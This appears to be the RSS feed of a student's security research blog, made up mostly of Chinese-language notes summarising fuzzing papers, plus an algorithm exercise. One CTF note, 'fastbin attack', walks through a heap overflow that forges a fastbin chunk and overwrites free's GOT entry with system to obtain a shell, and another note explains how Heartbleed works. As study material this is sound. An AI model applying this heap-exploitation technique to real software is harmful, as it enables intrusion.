<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>BLOG</title>
    <link>https://examplesite.com/</link>
    <description>Recent content on BLOG</description>
    <image>
      <title>BLOG</title>
      <url>https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sat, 01 Jul 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://examplesite.com/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>对一些问题的说明</title>
      <link>https://examplesite.com/posts/%E5%BB%BA%E7%AB%99/%E5%AF%B9%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E8%AF%B4%E6%98%8E/</link>
      <pubDate>Sat, 01 Jul 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/%E5%BB%BA%E7%AB%99/%E5%AF%B9%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E8%AF%B4%E6%98%8E/</guid>
      <description>因为之前一直在本地写乱七八糟的东西，某一天想搭个博客来分享。 于是搭好了，东西一股脑的全放了上来。 之前的文章还是有一些问题的，比如图片不加载（码云防盗链，之后拿github做图床了），公式不渲染等等。 2023年7月后的文章应该不会有这些问题了（大概吧&amp;hellip;&amp;hellip;）</description>
    </item>
    
    <item>
      <title>Fuzzing Error Handling Code using Context-Sensitive Software Fault Injection</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-using-context-sensitive-software-fault-injection/</link>
      <pubDate>Thu, 29 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-using-context-sensitive-software-fault-injection/</guid>
      <description>使用上下文敏感软件故障注入模糊化错误处理代码</description>
    </item>
    
    <item>
      <title>Fuzzing Error Handling Code in Device Drivers Based on Software Fault Injection</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-in-device-drivers-based-on-software-fault-injection/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fuzzing-error-handling-code-in-device-drivers-based-on-software-fault-injection/</guid>
      <description>基于软件故障注入的设备驱动程序模糊错误处理代码</description>
    </item>
    
    <item>
      <title>AFLNET: A Greybox Fuzzer for Network Protocols 论文笔记</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflnet-a-greybox-fuzzer-for-network-protocols/</link>
      <pubDate>Fri, 23 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflnet-a-greybox-fuzzer-for-network-protocols/</guid>
      <description>AFLNET是一个状态灰盒模糊器，使自动状态模型推理和覆盖引导模糊协同工作; 模糊化有助于生成新的消息序列来覆盖新的状态，并使状态模型逐渐更加完整。同时，动态构建的状态模型通过使用保留消息序列的状态覆盖和代码覆盖信息，帮助将模糊测试推向更重要的代码部分。</description>
    </item>
    
    <item>
      <title>13年12月CCF计算机软件能力认证</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/13%E5%B9%B412%E6%9C%88ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/%E7%AE%97%E6%B3%95/csp/13%E5%B9%B412%E6%9C%88ccf%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%BD%AF%E4%BB%B6%E8%83%BD%E5%8A%9B%E8%AE%A4%E8%AF%81/</guid>
      <description>如此编码 #include&amp;lt;bits/stdc++.h&amp;gt; using namespace std; const int N = 25; int n,m; int a[N],c[N],b[N]; int main(){ cin&amp;gt;&amp;gt;n&amp;gt;&amp;gt;m; for(int i = 1; i &amp;lt;= n; i++) cin&amp;gt;&amp;gt;a[i]; c[0] = 1; c[1] = a[1]; for(int i = 2 ; i &amp;lt;= n; i++) c[i] = c[i-1] * a[i]; for(int i = 1; i &amp;lt;= n; i++){ b[i] = m % a[i]; m = m / a[i]; } for(int i = 1; i &amp;lt;= n; i++) cout&amp;lt;&amp;lt;b[i]&amp;lt;&amp;lt;&amp;#34; &amp;#34;; return 0; } 出现次数最多的数 #include&amp;lt;bits/stdc++.</description>
    </item>
    
    <item>
      <title>AFLGO Directed Greybox Fuzzing</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflgo-directed-greybox-fuzzing/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/aflgo-directed-greybox-fuzzing/</guid>
      <description>#定向fuzzing
ABSTRACT 背景（问题）：现有灰盒fuzzer不能进行有效的定向fuzz 方法：基于模拟退火的power schedule，可以将更多的能量分配给更接近目标位置的种子，同时减少分配给距离目标距离更远的种子的能量。 成果：优于基于符号执行的定向白盒测试和非定向的灰盒测试；可以和谷歌持续模糊测试平台OSS-Fuzz进行整合；可以在几个模糊不清的安全关键项目（如LibXML2）中发现39个bug INTRODUCTION 定向fuzz的应用：补丁测试；崩溃重现；信息流检测
基于符号执行的白盒定向模糊测试的问题：耗时长
DFG：在本文中，我们介绍了定向灰盒模糊(DGF)，它专注于到达程序中给定的目标位置集。在高层次上，我们将可达性作为一个优化问题，并使用特定的元启发式来最小化生成的种子到目标的距离。为了计算种子距离，我们首先计算并测量每个基本块到目标的距离。虽然种子距离是过程间的，但我们的新度量只需要对调用图进行一次分析，对每个过程内CFG进行一次分析。在运行时，fuzzer聚合每个练习的基本块的距离值，以计算种子距离作为它们的平均值。DGF用于最小化种子距离的元启发式方法被称为模拟退火[19]，并被实现为功率调度。能量表控制所有种子[6]的能量。种子的能量是指种子发毛所花费的时间。像所有的灰盒模糊技术一样，通过将分析转移到编译时，我们可以最小化运行时的开销。
与基于符号执行的白盒定向模糊测试的区别：DGF将目标位置的可达性作为优化问题，而现有的定向（白盒）模糊方法将可达性作为迭代约束满足问题。
主要工作：灰盒模糊和模拟退火的整合；可以考虑多个目标、在检测时预先计算、可以运行时导出的，适用于程序间的一种正式的距离度量方法；AFLGO的实现整合和实验
MOTIVATING EXAMPLE 以心脏滴血漏洞为例子，简单来说该漏洞原理就是没有做边界检测而导致的数据溢出。
2.1 heartbleed and patch testing 简单的说，服务器端得到数据包，数据包长度为plen_real，而数据包中包含一个字节表明有效负载数据长度plen_fake，数据包剩下的部分是有效负载数据，长度为plen_real-1。整个数据包存储在一个char型数组之中。而服务器端构造新数据包时，先分配一段plen_fake+1的内存空间，前两个字节存放plen_fake，之后使用memcpy从收到的数据包有效负载数据起始位置向新数据包拷贝plen_fake字节数据。正常情况下plen_fake = plen_real-1，当用户有意设置plen_fake大于实际有效负载长度plen_real-1时，服务器就会发送plen_fake长度的数据，其中包括plen_fake - plen_real-1长度的数据，这些数据可能是一些用户密码或者密钥。
作者将AFLGO和KATCH比较，KATCH是最先进的基于符号执行的自动补丁测试工具。
2.2Fuzzing the Heartbleed-Introducing Source Code Commit 简述KATCH的工作原理：首先识别最接近目标t的基本块bi，然后构建可以到达该基本块的路径约束，接着识别决定从bi到达t的字节是哪个，最后把完整的路径约束放到SMT中求解。 基于符号执行的定向白盒模糊测试缺陷：耗时久，每探索一条路径都要重新计算距离；搜索可能不完整，解释器和求解器可能不支持语言特性或字节码；贪婪搜索可能陷入局部最优 AFLGO优势：AFLGo每秒生成并执行数千个输入，并在不到20分钟的时间内暴露Heartbleed；在运行时几乎不需要程序分析，只需要在编译/插装时进行轻量级程序分析；实现了基于模拟退火的全局搜索；实现了并行搜索，同时搜索多个目标 AFLGO测试心脏滴血流程 首先对OPENSSL插桩。对于插桩后的二进制程序，AFL负责检测代码覆盖率，AFLGO负责检测种子到目标的距离 然后使用模拟退火对OPENSSL模糊测试。 AFLGo进入探索阶段，并像AFL一样工作。在探索阶段，AFLGo随机变异提供的种子，以产生许多新的输入。如果一个新的输入增加了代码覆盖率，它将被添加到要模糊化的种子集;否则，将被丢弃。提供的和生成的种子在一个连续的循环中被模糊化。 在开发阶段，AFLGo从离目标更近的种子中产生更多的新输入，基本上不会浪费宝贵的时间去模糊太远的种子。AFLGo根据作为功率调度实现的退火函数，慢慢地从探索阶段过渡到开发阶段。 3 TRCHNIQUE 3.2Measure of Distance between a Seed Input and Multiple Target Locations 为函数调用图和基本块级的CFG中的每个节点分配一个值。
将距离为f (n,n&amp;rsquo;)的函数定义为调用图CG中函数n和n&amp;rsquo;之间沿最短路径的边数。我们将函数n与目标函数Tf之间的函数级目标距离df(n,Tf)定义为n与任何可达目标函数tf∈Tf之间的函数距离的调和平均值
m是基本块，n是函数
R（n,Tf）是所有可以从n到达的目标函数集合
db(m1,m2)是基本块m1和m2之间沿着最短路径的边数。
N(m)是基本块m调用的函数集合
T是图Gi中的基本块的集合
Gi是控制流图
基于上面的定义，基本块m到目标基本块Tb的距离为这个
种子s到目标基本块Tb的距离（normalized seed distance）为这个（种子的路径包含的基本块到目标基本块的和除以种子路径包含基本块的数量） $$d(s,T_{b})=\frac{\sum_{m\in\xi(s)}d_{b}(m,T_{b})}{|\xi(s)|} $$
作者还定义了normalized seed distance $$\tilde{d} (s,T_b)$$，这是种子s到目标基本块Tb的距离和种子序列中与目标基本块Tb的最小距离的差值比上最大距离和最小距离的差值 $$ \tilde { d } ( s , T _ { b } ) = \frac { d ( s , T _ { b } ) - \mathrm { m i n D } } { \mathrm { m a x } \mathrm { D - m i nD } } $$</description>
    </item>
    
    <item>
      <title>Android SmartTVs Vulnerability Discovery via Log-Guided Fuzzing</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/android-smarttvs-vulnerability-discovery-via-log-guided-fuzzing/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/android-smarttvs-vulnerability-discovery-via-log-guided-fuzzing/</guid>
      <description>中文译名：通过日志引导的安卓智慧电视漏洞模糊测试 作者：Yousra Aafer 单位：滑铁卢大学 国家： #法国 年份： #2021年 来源： #USENIX会议 关键字： #fuzzing 代码地址： 笔记建立时间： 2023-04-22 14:16
abstract 开发了一种新的动态模糊方法，其特点是基于日志的动态输入规范推导和反馈收集。我们的解决方案进一步引入了一种新的外部观察者，它可以监测与电视相关的物理症状 (即视觉和听觉)，以检测潜在的身体异常。
introduction 静态分析发现“有趣”的定值目标，作者专注于供应商集成到操作系统中的 API 动态分析曹勇即时日志分析技术，推断目标 API 的输入规范并收集执行反馈。 background 操作系统定制化 API 多 操作设备物理状态的 API 运行在高权限环境中 大多数 API 缺乏保护机制 挑战 逆向分析目标接口 对输入标准的逆向 对本地层的 API 描述符的逆向 评估执行反馈——主要是程序肯能不会崩溃，但是设备的物理反应会存在异常 0 Design Overview 4 Fuzzing Target Locator 目的：提取程序中的定制服务 方法：将提取的 api 和 AOSP 模型的 API 比较，AOSP 中没有的就是定制 api 检测系统服务 API java 层 api 可以从相应服务 IBinder 接口的字节码中提取 本机层 api 求助于在底层 Binder IPC 中提取本地函数的接口 也就是说，对于每个本机 API，我们的目标是从本机二进制文件中恢复事务 id、参数、回复数据类型 提取本地函数接口 对这部分不感兴趣，跳过。</description>
    </item>
    
    <item>
      <title>Automated Exploitable Heap Layout Generation for Heap Overflows Through Manipulation Distance-Guided Fuzzing</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-exploitable-heap-layout-generation-for-heap-overflows-through-manipulation-distance-guided-fuzzing/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-exploitable-heap-layout-generation-for-heap-overflows-through-manipulation-distance-guided-fuzzing/</guid>
      <description>中文译名：通过操纵距离引导的模糊测试自动生成堆溢出的可利用堆布局 作者：Bin Zhang 单位：国防科大 国家： #中国 年份： #2023年 来源： #USENIX会议 关键字： #fuzzing #AGE 代码地址：Epeius/Scatter: Automatically Generate Exploitable Memory Layout for HeapOOB-Write Vulnerabilities in Non-Interpreter Software (github.com) （代码没有上传，只有readme） 笔记建立时间： 2023-05-31 09:35 #TODO
Abstract heap primitives are leveraged to construnct exploitable states prior efforts only focus on particular program types or programs with dispatcher-loop structures, these are hard for general-purpose programs this paper present scatter, enabling the generation of exploitable heap layouts for heap overflows in generalpurpose programs in a primitive-free manner.</description>
    </item>
    
    <item>
      <title>Automated Extraction of Software Names from Vulnerability Reports using LSTM and Expert System</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-extraction-of-software-names-from-vulnerability-reports-using-lstm-and-expert-system/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/automated-extraction-of-software-names-from-vulnerability-reports-using-lstm-and-expert-system/</guid>
      <description>中文译名：利用 LSTM 和专家系统从漏洞报告中自动提取软件名称 作者：Igor Khokhlov 单位：圣心大学 国家： #意大利 年份： #2022年 来源： #IEEE_STC 关键字： #提取信息 代码地址： 笔记建立时间： 2023-05-15 10:20
Abstract proposes a machine learning method to extract software product names and version from unstructured CVE descriptions automatically create context-aware features by using Word2Vec and Char2Vec use this features to train a NER model using LSTM based on the previously published CVE descriptions, author create a set of Expert System (ES) rules to refine the predictions of the NER model and improve the preformance of the developed method.</description>
    </item>
    
    <item>
      <title>BEACON Directed Grey-Box Fuzzing with Provable Path Pruning</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/beacon-directed-grey-box-fuzzing-with-provable-path-pruning/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/beacon-directed-grey-box-fuzzing-with-provable-path-pruning/</guid>
      <description>中文译名：信标: 具有可证明路径剪枝的定向灰盒模糊测试 作者：Huang Heqing 单位：香港科技大学 国家： #中国 年份： #2022年
来源： #SP 关键字： #定向fuzzing 代码地址： https://hub.docker.com/r/yguoaz/beacon 笔记建立时间： 2023-05-09 17:27
摘要 当前的定向 fuzzer 不够高效，因为它们符号化或者具体的执行了很多不会到达 target code 到的 path，浪费了很多计算资源 beacon——通过一种可证明的方式在路径之海中引导灰盒模糊测试 轻量级的静态分析——用于计算到达目标的先决条件——用于修剪无法到达 target 的路径 引言 传统模糊测试应用于 检测漏洞路径 生成潜在漏洞的 poc 崩溃复现 追踪信息流 定向 fuzzing 现状 定向白盒模糊器依靠符号执行，通过求解路径约束来确定可达性，旨在为生成能够到达目标的输入提供理论保证。因此，它们对符号执行的固有使用从根本上限制了它们的扩展能力。 定向灰盒模糊器通常不考虑拒绝不可达路径。它们依靠从执行反馈中收集的启发式方法，根据到达目标代码的可能性对种子进行优先排序。他们要么使用轻量级的元启发式，例如，到目标的距离，要么使用机器学习技术来预测可达性，但不能保证这种优先级会导致拒绝任何不可行的路径。因此，在 AFLGo 中提到的24小时实验中，95%以上的输入无法到达给定的程序点。 定向 fuzzing 的关键在于尽可能早的剔除不能到达 target 的执行路径 BEACON 耗费低的静态分析计算程序变量的合理近似值，这些值用于决定某条路径是否可以到达 target 为了使得静态分析精确又高效，采用了两种新的优化方法：关系保持和有界析取 基于此对模糊测试中要执行的路径进行修剪（作者称可以达到 80%以上的修剪） 在路径遇到控制流图上不能到达目标的指令时，直接对路径进行剪枝 可到达目标但路径条件不满足的路径进行剪枝 提高： BEACON 平均可以早期拒绝82.94%的路径 与传统的定向模糊器相比，速度提高了11.50倍 对于 AFL、afl++和 Mopt 等 fuzzers, BEACON 可以分别加速6.31倍、11.86倍和10.92倍来重现目标 bug BEACON 发现了14个不完整的修复和8个新 bug 概述 输入为程序源代码和模糊测试目标 首先进行可达性分析，剔除无法到达任何目标的路径 进行反向区间分析 因为选择了区间域作为先决条件的抽象，损失了精确度，所以采用以下两种优化方法 关系保持——保留计算式类的约束条件 边界提取——设定阈值，超过阈值才合并路径 有选择性的插桩 在 BEACON 中，我们检测两种语句: 变量定义语句和分支语句 插桩用于修剪路径 方法 预备工作 作者给出了一个语言简化表示的语法 转换规则 Backward Interval Analysis 以图二为例，用该算法进行分析，从 18 行开始向上反向分析，初始的后置条件是 true，当分析到第 9 行时，碰到了第一个分支, 此时的先验条件分裂为两条，分别是： 在实际分析中可能会分裂为许多条，进行求解非常复杂，同时还需要在 18 行进行合并，还会丢失一定的精度。 为了提高效率，我们建议使用区间抽象来支持路径条件的轻量级推理和反向路径的合理过度逼近。（算法 7-18 行） 经过合并后的 pc 1 和 pc 2 如下图： 综上，我们可以看到后向间隔分析负责得到一个合理逼近的 target 的先验条件</description>
    </item>
    
    <item>
      <title>DGF generate POC base known information</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/dgf-generate-poc-base-known-information/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/idea/dgf-generate-poc-base-known-information/</guid>
      <description>论文 CCS 17 [[SemFuzz Semantics-based Automatic Generation of Proof-of-Concept Exploits]]（中国人民大学游伟老师，也是一直有在做 fuzz） 思考一下如何推广到任意的二进制程序 他是如何将提取的漏洞信息通知 fuzzer 的 ![[SemFuzz 总结笔记#what can i improve]] [[Extractor_ Extracting Attack Behavior from Threat Reports]] 威胁报告中提取攻击行为 这篇论文的工作看起来是做的相当完善了 开源 突然想起来师姐的论文也有 cve 提取，看看师姐论文 [[Android SmartTVs Vulnerability Discovery via Log-Guided Fuzzing]]这个不知道有没有用，也是游伟老师团队的，还没下载 利用 word2vec + cnn 识别 log 中的目标信息，然后用这些目标信息来变异 没有开源代码，想知道它是怎么去指导变异的 [[ProFuzzer On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery]] 亮点在于对输入格式的探测 没有开源 [[Automated Extraction of Software Names from Vulnerability Reports using LSTM and Expert System]] 会议没听说过，可能会有点水 利用Word2Vec+LSTM构成的NRE模型实现对CVE description中每个单词的分类，分为software name和software version 使用作者总结的规则来判断SV和SN对 代码没开源 [[Towards the Detection of Inconsistencies in Public Security Vulnerability Reports]] 和上面那篇差不多，利用神经网络提取CVE报告中的software name和software version 但是使用的网络结构不同，这篇的网络结构比较复杂，使用了NER和RE模型 NER用于识别SN和SV，RE用于判断哪两个SN和SV是一对 代码开源 EVIL: Exploiting Software via Natural Language 可能相关一篇 B 类 用seq2seq和codeBert模型将自然语言翻译为代码 但是自然语言需要及其详细 Unleashing Coveraged-Based Fuzzing Through Comprehensive, Efficient, and Faithful Exploitable-Bug Exposing A 类期刊关于定向 fuzz Pangolin: Incremental Hybrid Fuzzing with Polyhedral Path Abstraction 增量混合 Chainsaw: Chained Automated Workflow-based Exploit Generation 自动生成 web 应用程序的漏洞利用，可能会有点启发 CRAXweb: Automatic Web Application Testing and Attack Generation 同上 Automatic Exploit Generation - 知乎 (zhihu.</description>
    </item>
    
    <item>
      <title>EVIL Exploiting Software via Natural Language</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/evil-exploiting-software-via-natural-language/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/evil-exploiting-software-via-natural-language/</guid>
      <description>中文译名：evil: 利用自然语言开发软件 作者：Pietro Liguori 单位：那不勒斯费德瑞科二世大学 国家： #意大利 年份： #2021年 来源： #IEEE_ISSRE_CCFB 关键字： #NLP_AGE 代码地址：dessertlab/EVIL: EVIL (Exploiting software VIa natural Language) is an approach to automatically generate software exploits in assembly/Python language from descriptions in natural language. The approach leverages Neural Machine Translation (NMT) techniques and a dataset that we developed for this work. (github.com) 笔记建立时间： 2023-05-15 22:29 这篇论文幸好是21年，要是今年发就惨了
ABSTRACT EVIL can automatically generate exploits in assembly/python language from descriptions in natural language.</description>
    </item>
    
    <item>
      <title>Extractor_ Extracting Attack Behavior from Threat Reports</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/extractor_-extracting-attack-behavior-from-threat-reports/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/extractor_-extracting-attack-behavior-from-threat-reports/</guid>
      <description>中文译名：提取器: 从威胁报表中提取攻击行为 作者：Kiavash Satvat 单位：伊利诺伊大学芝加哥分校 国家： #美国 年份： #2021年 来源： #SP 关键字： #提取信息 代码地址： https://github.com/ksatvat/Extractor 笔记建立时间： 2023-04-13 17:43
摘要 提出 EXTRACTOR，可以从 CTI 报告（Cyber Threat Intelligence reports）中精确提取简洁的攻击行为 可以提取非结构化文本，对文本没有要求 1. Introduction 挑战 冗长：威胁报告中充斥着大量无关文本。 CTI 报告的句法和语义复杂性、技术术语的普遍使用以及缺乏适当的标点符号很容易影响报告的解释和攻击行为的提取。 难以准确地解释技术报告中的复杂逻辑。 目标 除了解决上面的挑战，作者还想实现两个目标：
可操作的情报：EXTRACTOR 从文本中提取的攻击行为必须能在系统审计日志中被观察到，并能有效地用于威胁检测。不需要人员或工具的进一步处理 准确处理大量 CTI 报告。 自动挖掘更大的知识源（能够处理不同的文本） 从 CTI 报告中构建图表表示 从与不同组织中的同一攻击相关的各种 CTI 源提取信息 2. 问题和背景 问题描述 （实现效果） 报告 (左图)是 njRAT的自由改编，删除了不相关的句子。这个例子展示了语言的复杂性，这将在本文中讨论。在相应的来源图中 (右侧)，节点表示系统实体，边指向系统调用。矩形、椭圆形、五边形和菱形分别表示文件、进程、注册表和套接字。
挑战 冗余 CTI 文本的复杂性 缺少标点符号——NLP 工具难以分辨句子边界 专业单词——NLP 工具是用通用英语来训练的。 省略：CTI 报告中经常出现缺少主语或宾语的情况 不能忽略代词。 复杂的语言结构：结构的复杂性和各种语言技术 (如回指、名词化和列表)的使用可能会混淆常见的 NLP 工具。总的影响是，许多主语、动词和宾语被错误地分类并无法解决。 关系的提取：不能仅仅依赖句子的语法结构，还要分析语义 3.</description>
    </item>
    
    <item>
      <title>fastbin attack</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/fastbin-attack/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/2.%E5%88%B7%E9%A2%98/ctf/pwn/fastbin-attack/</guid>
      <description>(72条消息) 堆漏洞挖掘——fastbin attack漏洞_董哥的黑板报的博客-CSDN博客 fastbin attack总体上来说就是去修改挂在fastbin上free chunk的fd指针。比如现在fastbin上挂着一个free的chunk a，它的fd指针为0。因为没有别的free chunk了。我们修改了这fd指针，指向了一个我们想编辑的区域，这样相当于是让系统误以为在a chunk后还有一个free chunk。我们通过两次malloc就可以得到fake chunk的指针，从而实现编辑该区域。 但是伪造fake chunk需要满足两个条件，size大小合适，并且PREV_INUSE为1。 由于系统中0x7f这样的数值比较好找，所以我们在目标区域周围找一找有没有0x7f，然后让fake chunk的size字段位于这个0x7f区域，这样就可以通过检查。 那如果找不到0x7f呢。需要 [[unsortedbin attack]]
double free (72条消息) 好好说话之Fastbin Attack（1）：Fastbin Double Free_hollk的博客-CSDN博客
house of spirit (72条消息) 好好说话之Fastbin Attack（2）：House Of Spirit_hollk的博客-CSDN博客 直接看例题好理解一点 [ZJCTF 2019]EasyHeap 漏洞点出在edit_heap函数，它没有对写入的size进行限制。 （btw，system函数的cat flag是假的） 这道题可以修改got表，我们的目标就是修改某个函数的got表，然后当调用这个函数的时候，调用了system函数。 比如我们将free函数的got表写成system函数的地址，那么我们调用free (&amp;quot;/bin/sh&amp;quot;) 就是system (&amp;quot;/bin/sh&amp;quot;) free函数的got地址可以通过elf. got[&amp;lsquo;free&amp;rsquo;]得到。同样的system地址也可以得到 那么如何修改free的got呢，我们可以伪造一个指向free got的fake chunk，然后将该fake chunk申请下来，就能修改free got的值 思路： 我们申请两个chunk a和b，将b free，然后通过a溢出修改b，将b的fb指向目标地址（就是got），这里要注意要找个有0x7f的地方。然后将b申请回来，然后再申请一个0x60大小的chunk就拿到了我们的fake chunk，修改fake chunk就把free的got改成system了。 然后我们申请一个chunk，chunk内容是&amp;quot;/bin/sh&amp;quot;，然后释放这个chunk，就ok了。 free (heaparray[n]) == system (heaparray[n]) == system (&amp;quot;/bin/sh&amp;quot;)</description>
    </item>
    
    <item>
      <title>FIRM-AFL: High-Throughput Greybox Fuzzing of IoT Firmware via Augmented Process Emulation</title>
      <link>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/firm-afl_-high-throughput-greybox-fuzzing-of-iot-firmware-via-augmented-process-emulation/</link>
      <pubDate>Thu, 22 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>https://examplesite.com/posts/1.%E5%AD%A6%E4%B9%A0/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/fuzzing/2.%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/firm-afl_-high-throughput-greybox-fuzzing-of-iot-firmware-via-augmented-process-emulation/</guid>
      <description>中文译名：FIRM-AFL：通过增强过程仿真实现的物联网固件的高通量灰盒模糊测试 作者：郑 yaowen 单位：中国科学院信息工程研究所北京物联网重点实验室 国家： #中国 年份： #2019年 来源： #USENIX会议 关键字： #嵌入式 #fuzzing 笔记建立时间： 2023-02-07 09:13
